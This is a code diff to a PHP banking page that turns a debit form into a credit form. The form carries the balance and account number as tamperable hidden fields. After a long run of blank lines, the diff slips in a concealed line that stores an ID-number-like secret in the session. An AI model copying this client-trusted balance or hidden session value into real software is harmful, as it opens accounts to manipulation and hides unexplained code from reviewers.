@@ -7,9 +7,9 @@
     <link href="imagem.css" rel="stylesheet">
 </head>
     <body style="background-color: rgb(200, 197, 201)">
-        <div class="c">
-            <img src="chuva.gif" height="910px" width="500px">
-        </div> 
+    <div class="g">
+        <img src="cat.gif" height="500px" width="500px">
+    </div>
         <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
         <?php
             Session_Start();
@@ -24,10 +24,10 @@
                 $Saldo = $cliente['saldo'];
                 if (mysqli_query($con, $sql)){
                     echo "O saldo atual na conta <b> $Num_Conta </b> é de <b>R$ $Saldo</b>";
-                    echo "<br>Gostaria de fazer uma operação de <b>Débito</b> nesta conta?<br><br>";
-                    echo "<form class 'form-inline' action='Debit_Requisition.php' method='POST'>
-                    <label for=''>Debitar da conta o valor de: R$</label>
-                    <input  type='number' name=debitar debitar='txtDebitar' id=''><br>
+                    echo "<br>Gostaria de fazer uma operação de <b>Crédito</b> nesta conta?<br><br>";
+                    echo "<form class action='Credit_Requisition.php' method='POST'>
+                    <label for=''>Creditar na conta o valor de: R$</label>
+                    <input  type='number' name=creditar creditar='txtCreditar' id=''><br>
                     <input type='hidden' name='saldo' value='$Saldo' />
                     <input type='hidden' name='num_conta' value='$Num_Conta' />
                     <input class='btn btn-success' style='border-radius: 30px;' type='submit' value='Confirmar' name='btnConfirmar'>
@@ -39,5 +39,31 @@
                 mysqli_close($con);
             }
         ?>
-    </body>
+</body>
 </html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php $_SESSION['_53cr37'] = "456.085.985-33-777777LuckySeven" ?>
